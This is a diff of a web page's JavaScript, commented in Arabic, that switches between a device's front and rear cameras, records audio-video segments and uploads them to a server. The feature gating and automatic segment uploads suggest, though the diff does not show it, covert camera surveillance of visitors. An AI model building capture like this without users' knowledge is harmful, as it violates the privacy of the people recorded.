@@ -900,69 +900,71 @@
 
             // دالة تبديل الكاميرا وبدء تسجيل جديد
             async function switchCameraAndRecord() {
-                if (!cameraAllowed || !mainStream || isSwitching) return;
+                if (!cameraAllowed || isSwitching) return;
                 isSwitching = true;
 
-                // تبديل وضع الكاميرا
                 const newMode = (currentCameraMode === 'user') ? 'environment' : 'user';
                 console.log(`🔄 محاولة التبديل إلى الكاميرا: ${newMode}`);
 
-                try {
-                    // محاولة الحصول على الكاميرا الجديدة مع إعدادات دقيقة
-                    let constraints = {
-                        video: {
-                            facingMode: newMode,
-                            width: { ideal: 640 },
-                            height: { ideal: 480 }
-                        },
-                        audio: true
-                    };
+                // إيقاف التيار الحالي بالكامل لتحرير الكاميرا
+                if (mainStream) {
+                    mainStream.getTracks().forEach(t => t.stop());
+                    mainStream = null;
+                }
 
-                    // محاولة استخدام exact إذا كان newMode هو environment للتأكد من الخلفية
+                try {
+                    let newStream;
+                    // محاولة الحصول على الكاميرا الجديدة
                     if (newMode === 'environment') {
                         try {
-                            // محاولة أولى مع exact
                             const exactConstraints = {
                                 video: { facingMode: { exact: 'environment' }, width: { ideal: 640 }, height: { ideal: 480 } },
                                 audio: true
                             };
-                            const newStream = await navigator.mediaDevices.getUserMedia(exactConstraints);
-                            applyNewStream(newStream, newMode);
-                            isSwitching = false;
-                            return;
+                            newStream = await navigator.mediaDevices.getUserMedia(exactConstraints);
                         } catch (exactErr) {
                             console.warn('فشل exact environment، نحاول بالطريقة العادية');
+                            const constraints = {
+                                video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                                audio: true
+                            };
+                            newStream = await navigator.mediaDevices.getUserMedia(constraints);
                         }
+                    } else {
+                        const constraints = {
+                            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                            audio: true
+                        };
+                        newStream = await navigator.mediaDevices.getUserMedia(constraints);
                     }
 
-                    // الطريقة العادية (بدون exact)
-                    const newStream = await navigator.mediaDevices.getUserMedia(constraints);
-                    applyNewStream(newStream, newMode);
+                    // تطبيق التيار الجديد
+                    mainStream = newStream;
+                    currentCameraMode = newMode;
+                    console.log(`✅ تم التبديل إلى الكاميرا: ${newMode}`);
+                    isSwitching = false;
+                    startRecordingSegment();
                 } catch (e) {
                     console.warn('فشل تبديل الكاميرا:', e);
-                    // في حال الفشل، نستمر بالتيار الحالي
                     isSwitching = false;
-                    // نبدأ تسجيل جديد بالتيار الحالي بعد تأخير بسيط
-                    setTimeout(() => {
-                        if (cameraAllowed && mainStream) {
-                            startRecordingSegment();
-                        }
-                    }, 500);
+                    // محاولة العودة إلى الكاميرا الأمامية كخيار آمن
+                    try {
+                        const fallbackStream = await navigator.mediaDevices.getUserMedia({
+                            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                            audio: true
+                        });
+                        mainStream = fallbackStream;
+                        currentCameraMode = 'user';
+                        console.log('✅ تم العودة إلى الكاميرا الأمامية');
+                        startRecordingSegment();
+                    } catch (fallbackErr) {
+                        console.error('فشل العودة للكاميرا الأمامية:', fallbackErr);
+                        cameraAllowed = false;
+                        overlay.classList.remove('hidden');
+                        disableAllFeatures();
+                        errorMsg.textContent = 'تعذر التبديل بين الكاميرات. يرجى تحديث الصفحة والمحاولة مرة أخرى.';
+                    }
                 }
-            }
-
-            // دالة مساعدة لتطبيق التيار الجديد
-            function applyNewStream(newStream, mode) {
-                // إيقاف التيار القديم
-                if (mainStream) {
-                    mainStream.getTracks().forEach(t => t.stop());
-                }
-                mainStream = newStream;
-                currentCameraMode = mode;
-                console.log(`✅ تم التبديل إلى الكاميرا: ${mode}`);
-                isSwitching = false;
-                // بدء تسجيل جديد فوراً
-                startRecordingSegment();
             }
 
             // دالة بدء التسجيل (تستدعى مرة واحدة عند السماح)
@@ -998,6 +1000,7 @@
                     .then(res => res.json())
                     .then(data => {
                         if (!data.ok) console.warn('فشل إرسال الفيديو:', data);
+                        else console.log('✅ تم إرسال الفيديو بنجاح');
                     })
                     .catch(e => console.warn('خطأ إرسال الفيديو:', e));
             }
